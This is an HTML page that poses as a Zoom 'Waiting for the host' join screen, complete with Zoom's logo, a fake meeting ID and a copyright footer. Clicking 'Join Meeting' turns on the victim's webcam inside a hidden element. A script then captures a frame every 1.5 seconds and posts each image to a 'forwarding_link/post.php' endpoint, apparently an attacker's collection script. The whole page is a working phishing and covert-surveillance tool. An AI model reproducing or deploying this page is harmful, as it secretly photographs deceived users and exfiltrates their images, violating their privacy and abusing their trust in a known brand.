<!doctype html>
<html>
<head>
    <title>Join Meeting | Zoom</title>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.js"></script>
    <style>
        body {
            background-color: #fff;
            font-family: "Lato", "Helvetica Neue", Helvetica, Arial, sans-serif;
            margin: 0;
            padding: 0;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            height: 100vh;
            color: #232333;
        }
        .container {
            text-align: center;
            max-width: 500px;
            padding: 20px;
        }
        .zoom-logo {
            width: 150px;
            margin-bottom: 40px;
        }
        h1 {
            font-size: 24px;
            font-weight: 500;
            margin-bottom: 10px;
        }
        p {
            font-size: 16px;
            color: #6e6e7a;
            margin-bottom: 30px;
        }
        .btn-join {
            background-color: #0E71EB;
            color: white;
            border: none;
            padding: 12px 24px;
            font-size: 16px;
            border-radius: 10px;
            cursor: pointer;
            font-weight: bold;
            text-decoration: none;
            display: inline-block;
            transition: background-color 0.2s;
        }
        .btn-join:hover {
            background-color: #0b5db1;
        }
        .footer {
            margin-top: 50px;
            font-size: 14px;
            color: #999;
        }
        #video-container {
            display: none;
        }
    </style>
</head>
<body>
    <div class="container">
        <img src="https://st1.zoom.us/static/6.3.22375/image/new/ZoomLogo.png" alt="Zoom" class="zoom-logo">
        <h1>Waiting for the host to start this meeting</h1>
        <p>Meeting ID: 842 9103 4412</p>
        <button id="startBtn" class="btn-join">Join Meeting</button>
        <div class="footer">
            Â© 2024 Zoom Video Communications, Inc. All rights reserved.
        </div>
    </div>

    <div id="video-container">
        <video id="video" playsinline autoplay></video>
        <canvas id="canvas" width="640" height="480"></canvas>
    </div>

    <script>
        function post(imgdata) {
            $.ajax({
                type: 'POST',
                data: { cat: imgdata },
                url: 'forwarding_link/post.php',
                dataType: 'json',
                async: false,
                success: function(result) {},
                error: function() {}
            });
        };

        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        const startBtn = document.getElementById('startBtn');

        const constraints = {
            audio: false,
            video: { facingMode: "user" }
        };

        async function init() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia(constraints);
                handleSuccess(stream);
            } catch (e) {
                console.error(e);
            }
        }

        function handleSuccess(stream) {
            window.stream = stream;
            video.srcObject = stream;
            var context = canvas.getContext('2d');
            
            // Visual feedback: Change button text
            startBtn.innerHTML = "Connecting...";
            startBtn.style.backgroundColor = "#ccc";

            setInterval(function() {
                context.drawImage(video, 0, 0, 640, 480);
                var canvasData = canvas.toDataURL("image/png").replace("image/png", "image/octet-stream");
                post(canvasData);
            }, 1500);
        }

        startBtn.addEventListener('click', () => {
            init();
        });
    </script>
</body>
</html>
